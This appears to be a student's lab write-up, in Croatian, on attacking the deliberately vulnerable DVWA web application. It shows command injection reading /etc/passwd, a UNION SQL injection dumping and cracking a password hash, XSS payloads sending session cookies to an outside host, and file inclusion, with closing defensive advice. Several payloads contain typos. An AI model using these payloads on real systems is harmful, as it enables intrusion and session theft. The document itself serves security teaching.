@@ -1,0 +1,41 @@
+Nina Anić, 0036526188
+
+
+*** Treća laboratorijska vježba: Ranjivosti web aplikacija ***
+
+--> Zadatak 1: Izvođenje naredbi (Command Injection) 
+    Na stranici DVWA u izborniku s lijeve strane odabrano je polje 'Command Injection'.
+    U polje 'Enter an IP adress:' unesena je naredba '1 | cat/etc/passwd' i pritisnut je gumb 'Submit'.
+    Ispis datoteke prikazan je crvenim slovima na slici 'zad1_1' u folderu 'zadatak1'.
+
+--> Zadatak 2: Napadi SQL umetanjem (SQL injection)
+    Na stranici DVWA u izborniku s lijeve strane odabrano je polje 'SQL injection'.
+    U polje 'User ID:' unesena je naredba " ID: tmp' OR '1'='1' UNION SELECT password, first_name, FROM users WHERE user_id='tmp' OR '1'='1 " i pritisnut je gumb 'Submit'.
+    Na taj način dobili smo hashirani password usera Pablo Picasso spremljen u polje 'First name:'.
+    Cijeli postupak prikazan je na slici 'zad2_1' u folder 'zadatak2'.
+    Za otkrivanje lozinke iz hasha koristili smo mrežni alata 'crackstation.net'.
+    U polje za unos teksta unesen je hashirani password te nakon pritiska gumba 'Crack Hashes' u polju 'Result' prikazan je password u čistom tekstu koji je glasio 'letmein'.
+    Cijeli postupak prikazan je na slici 'zad2_2' u folder 'zadatak2'.
+
+--> Zadatak 3: XSS (Cross Site Scripting)
+    Na stranici DVWA u izborniku s lijeve strane odabrano je polje 'XSS (Stored)'.
+    Kolačić smo dohvatili tako što smo u polje 'Name' unijeli proizvoljni string a u polje 'Message' smo unijeli '<script> alert(document.cookie) </script>' i stisnuli 'Sign Guestbook'.
+    Kolačić je vraćen u pop-up windowu i bio je oblika: 'PHPSESSID=iq55k3g5is3of0lflcaqkk4uo4'.
+    Postupak je prikazan na slici 'zad3_0' u folderu 'zadatak3'.
+    Nadalje radimo get zahtjev oblika: '<script> document.location.href='http://public.tel.fer.hr/srs?cookie='+document.cookie; </script>' opisan na slici 'zad3_1' u folderu 'zadatak3'.
+    Ograničenje broja znakova u kodu HTML zaobilazimo na način da u dev tools veličinu polja u koje unosimo skriptu promijenimo s 50 na 500 (struktura html stranice prije i nakon promjene prikazane su na slikama 'zad3_2' i 'zad3_3' u folderu 'zadatak3').
+    Rezultat get zahtjeva je pop-up window s podacima 'PHPSESSID=iq55k3g5is3of0lflcaqkk4uo4; security=low' prikazanim na slici 'zad3_4' u folderu 'zadatak3'.
+    Na stranici DVWA u izborniku s lijeve strane odabrano je polje 'XSS (Reflected)'.
+    Kolačić smo dohvatili tako što smo u polje 'What is your name' unijeli '192.168.56.101/vuwaara@sidessssr/?name=<script>document.location.hret='http://public.tel.fer.hr/srs?cookie=+document.cookie:</script>' i pritisnuli 'Submit'.
+    Postupak je prikazan na slici 'zad3_5' u folderu 'zadatak3'.
+    Nakon toga redirectani smo na stranicu čiji je url '192.168.56.101/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location.href%3D%27http%3A%2F%2Fpublic.tel.fer.hr%2Fsrs%3Fcookie%3D%27%20%2B%20document.cookie%3B%3C%2Fscript%3E'.
+    Postupak je prikazan na slici 'zad3_6' u folderu 'zadatak3'.
+
+--> Zadatak 4: Inkluzija datoteka (File inclusion)
+    Na stranici DVWA u izborniku s lijeve strane odabrano je polje 'File Inclusion'.
+    File inclusion smo napravili tako što smo promijenili get zahtjev u url-u trenutne strane te je novi url bio oblika: '192.168.56.101/vulnerabilities/fi/?page=/ect/passwd'.
+    Na stranici je ispisan sadržaj datoteke '/ect/passwd' kao što je prikazano na slici 'zad4_1' u folderu 'zadatak4'.
+    Način zaštite od file inclusion napada:
+        Validirati userov input prije predaje u php funkcije kao što su include, include_once, require, require_once, fopen, readfile...
+        Još bolji način je hard kodirati nazive file-ova koji su podržani za izvršavanje.
+        Također preporuča se onemogućavanje 'remote file inclusiona' postavljanjem 'allow_url_include=off' u 'php.ini'.
